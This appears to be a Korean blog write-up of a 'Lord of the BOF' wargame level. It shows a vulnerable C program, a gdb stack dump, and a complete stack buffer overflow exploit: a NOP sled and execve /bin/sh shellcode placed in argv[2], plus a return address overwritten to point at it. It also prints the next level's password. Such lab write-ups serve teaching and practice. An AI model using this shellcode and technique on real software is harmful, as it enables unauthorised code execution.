---
title: "BOF - Lv.6 wolfman"
excerpt: "Lv.6 wolfman"
toc: true
toc_sticky: true
categories:
  - BOF
tags:
  - buffer overflow
---

## 1. Source Code
```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - darkelf
        - egghunter + buffer hunter + check length of argv[1]
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
        char buffer[40];
        int i;

        if(argc < 2){
                printf("argv error\n");
                exit(0);
        }

        // egghunter
        for(i=0; environ[i]; i++)
                memset(environ[i], 0, strlen(environ[i]));

        if(argv[1][47] != '\xbf')
        {
                printf("stack is still your friend.\n");
                exit(0);
        }

        // check the length of argument
        if(strlen(argv[1]) > 48){
                printf("argument is too long!\n");
                exit(0);
        }

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);

        // buffer hunter
        memset(buffer, 0, 40);
}
```
## 2. Vulnerability
argv[1]의 길이가 48로 제한되어 있음. 그래서 argv[2]를 이용해서 쉘코드를 넣으면 됨.

## 3. Solution
우선 argv[2] 주소를 찾아 리턴주소로 해주고 argv[2]로 쉘코드를 주면 됨.
```
./test `python -c 'print "A"*44+"BBB\xbf"'` `python -c 'print "C"*44+"DDD\xbf"'`
``` 
```
(gdb) x/100wx $esp
0xbffffad0:     0x00000000      0xbffffb14      0xbffffb24      0x40013868
0xbffffae0:     0x00000003      0x08048450      0x00000000      0x08048471
0xbffffaf0:     0x08048500      0x00000003      0xbffffb14      0x08048390
0xbffffb00:     0x0804864c      0x4000ae60      0xbffffb0c      0x40013e90
0xbffffb10:     0x00000003      0xbffffc0b      0xbffffc12      0xbffffc43
0xbffffb20:     0x00000000      0xbffffc74      0xbffffc86      0xbffffc9f
0xbffffb30:     0xbffffcbe      0xbffffce0      0xbffffced      0xbffffeb0
0xbffffb40:     0xbffffecf      0xbffffeec      0xbfffff01      0xbfffff20
0xbffffb50:     0xbfffff2b      0xbfffff3b      0xbfffff43      0xbfffff54
0xbffffb60:     0xbfffff5e      0xbfffff6c      0xbfffff7d      0xbfffff8b
0xbffffb70:     0xbfffff96      0xbfffffa9      0xbfffffec      0x00000000
0xbffffb80:     0x00000003      0x08048034      0x00000004      0x00000020
0xbffffb90:     0x00000005      0x00000006      0x00000006      0x00001000
0xbffffba0:     0x00000007      0x40000000      0x00000008      0x00000000
0xbffffbb0:     0x00000009      0x08048450      0x0000000b      0x000001f9
0xbffffbc0:     0x0000000c      0x000001f9      0x0000000d      0x000001f9
0xbffffbd0:     0x0000000e      0x000001f9      0x00000010      0x0f8bfbff
0xbffffbe0:     0x0000000f      0xbffffc06      0x00000000      0x00000000
0xbffffbf0:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffc00:     0x00000000      0x36690000      0x2e003638      0x7365742f
0xbffffc10:     0x41410074      0x41414141      0x41414141      0x41414141
0xbffffc20:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffc30:     0x41414141      0x41414141      0x41414141      0x42424141
0xbffffc40:     0x4300bf42      0x43434343      0x43434343      0x43434343
0xbffffc50:     0x43434343      0x43434343      0x43434343      0x43434343
```
0xbffffc44부터 argv[2]의 값이 들어감.  
```
./darkelf `python -c 'print "A"*44+"\x44\xfc\xff\xbf"'` `python -c 'print "\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
bash$ my-pass
euid = 506
kernel crashed
```
my-pass : kernel crashed